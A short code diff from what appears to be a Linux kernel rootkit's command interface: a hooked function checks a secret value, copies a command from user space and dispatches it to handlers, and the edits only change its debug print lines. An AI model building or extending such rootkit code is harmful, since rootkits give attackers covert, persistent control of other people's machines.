@@ -55,7 +55,7 @@ unsigned long iface_hook_func(unsigned long secret, char __user *command,
   iface_command_handler_t handler;
   unsigned int i;
 
-  printk(KERN_INFO "[rootkit interface]: In `iface__hook_func` (%p).\n", &iface_hook_func);////////////
+  //printk(KERN_INFO "[rootkit interface]: In `iface__hook_func` (%p).\n", &iface_hook_func);////////////
   
   if (!iface__hook.hooked)
     return -EINVAL;
@@ -69,7 +69,7 @@ unsigned long iface_hook_func(unsigned long secret, char __user *command,
     we don't care if this fails, because `strcmp`
     will take care of invalid buffers
     */
-printk("[rootkit interface] got secret");
+printk(KERN_INFO "[rootkit interface] got secret");
     memset(command_buf, '\0', sizeof(command_buf));
     strncpy_from_user(command_buf, command, sizeof(command_buf));
 
@@ -79,7 +79,7 @@ printk("[rootkit interface] got secret");
 
     for (i = 0; i < sizeof(iface__commands) / sizeof(iface__commands[0]); i++) {
       if (!strcmp(command_buf, iface__commands[i].command)) {
-        printk("[rootkit interface] got command \"%s\".", command_buf);/////////////////////////////
+        printk(KERN_INFO "[rootkit interface] got command \"%s\".", command_buf);/////////////////////////////
         handler = iface__commands[i].handler;
         break;
       }
